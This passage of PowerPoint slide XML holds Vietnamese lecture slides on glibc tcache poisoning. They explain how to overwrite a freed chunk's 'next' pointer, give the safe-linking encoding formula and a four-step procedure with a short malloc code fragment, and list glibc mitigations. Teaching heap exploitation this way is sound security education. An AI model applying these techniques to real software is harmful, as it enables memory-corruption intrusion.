          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="914400"/>
            <a:ext cx="3593592" cy="5120640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2036"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1143000"/>
            <a:ext cx="3108960" cy="27432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NỘI DUNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1554480"/>
            <a:ext cx="3154680" cy="4297680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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6.1  Cơ chế ghi next</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6.1  Quy trình 4 bước</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6.2  Mục tiêu thực tế</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6.3  Metadata attack</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6.4  Biến thể khác (ngoài phạm vi)</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     Chuỗi khai thác</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Tcache poisoning: ghi đè next để điều hướng malloc()</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6.1 · KHÔNG FREE TRÙNG NỮA — GHI ĐÈ next CỦA CHUNK ĐÃ FREE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="11274552" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7273"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1581912"/>
            <a:ext cx="1090879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Ý TƯỞNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="10908792" cy="43891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Mục 5.4 cho thấy từ 2.29 free trùng trực tiếp bị chặn. Để malloc() vẫn trả về địa chỉ tự chọn: free một chunk cùng size class với mục tiêu, ghi next trỏ thẳng tới địa chỉ muốn (đúng kỹ thuật Sink A/B ở 5.5 làm bằng tay), rồi malloc() hai lần — lần 2 nhận chunk tại địa chỉ đã chọn (arbitrary allocation).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2606040"/>
            <a:ext cx="6583680" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2770632"/>
            <a:ext cx="6126480" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2.32+ — CÔNG THỨC SAFE-LINKING</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3063240"/>
            <a:ext cx="6217920" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>stored_next = target ^</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  (address_of_next_field &gt;&gt; 12)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3886200"/>
            <a:ext cx="6172200" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Không biết địa chỉ heap thì không tính được giá trị mã hoá hợp lệ.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="2606040"/>
            <a:ext cx="4462272" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7452360" y="2770632"/>
            <a:ext cx="4096512" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>VÌ SAO SINK A/B (5.5) CHỈ CHẠY TRỌN TRÊN 2.26–2.28</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7452360" y="3063240"/>
            <a:ext cx="4096512" cy="153619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Trước safe-linking: ghi next trần vẫn qua được. Từ 2.32+ phải có heap leak mới tạo được giá trị mã hoá hợp lệ.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4937760"/>
            <a:ext cx="5522976" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="510235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MALLOC() KIỂM TRA ALIGNMENT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5394960"/>
            <a:ext cx="5157216" cy="71323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target sai căn chỉnh → abort </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc(): unaligned tcache chunk detected</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> trước khi dữ liệu bị chạm tới.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="4937760"/>
            <a:ext cx="5522976" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="510235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2.34+ — BỎ __malloc_hook/__free_hook</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="5394960"/>
            <a:ext cx="5157216" cy="71323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Ghi đè hook như Sink B (5.5) chỉ còn áp dụng cho target glibc cũ.</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Quy trình: từ chunk đã free tới arbitrary allocation</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6.1 · 4 BƯỚC THEO THỨ TỰ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="2647188" cy="2560320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2857"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="621792" y="1554480"/>
            <a:ext cx="2318004" cy="64008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1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="621792" y="2286000"/>
            <a:ext cx="2318004" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>free() một chunk cùng size class với mục tiêu</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3131820" y="2697480"/>
            <a:ext cx="173736" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3332988" y="1417320"/>
            <a:ext cx="2647188" cy="2560320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2857"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3497580" y="1554480"/>
            <a:ext cx="2318004" cy="64008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2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3497580" y="2286000"/>
            <a:ext cx="2318004" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ghi next trỏ thẳng tới địa chỉ muốn (2.32+: phải mã hoá theo công thức safe-linking)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6007608" y="2697480"/>
            <a:ext cx="173736" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="2647188" cy="2560320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2857"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6373368" y="1554480"/>
            <a:ext cx="2318004" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6373368" y="2286000"/>
            <a:ext cx="2318004" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>malloc() lần 1 — tiêu thụ entry bị hỏng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8883396" y="2697480"/>
            <a:ext cx="173736" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9084564" y="1417320"/>
            <a:ext cx="2647188" cy="2560320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2857"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9249156" y="1554480"/>
            <a:ext cx="2318004" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9249156" y="2286000"/>
            <a:ext cx="2318004" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>malloc() lần 2 — nhận đúng chunk tại địa chỉ đã chọn (arbitrary allocation)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4251960"/>
            <a:ext cx="6309360" cy="1965960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3721"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4361688"/>
            <a:ext cx="5943600" cy="22860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MÃ HOÁ CON TRỎ THEO SAFE-LINKING (6.1)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4663440"/>
            <a:ext cx="5943600" cy="1463040"/>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 glibc 2.32+: giá trị thật ghi vào next (bước 2)</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fake_next = target ^ (address_of_victim_next_field &gt;&gt; 12)</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bước 3-4: tiêu thụ entry rồi nhận chunk đích</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malloc(n);          /* lần 1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p = malloc(n);      /* lần 2: p == target */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="4251960"/>
            <a:ext cx="4736592" cy="1965960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
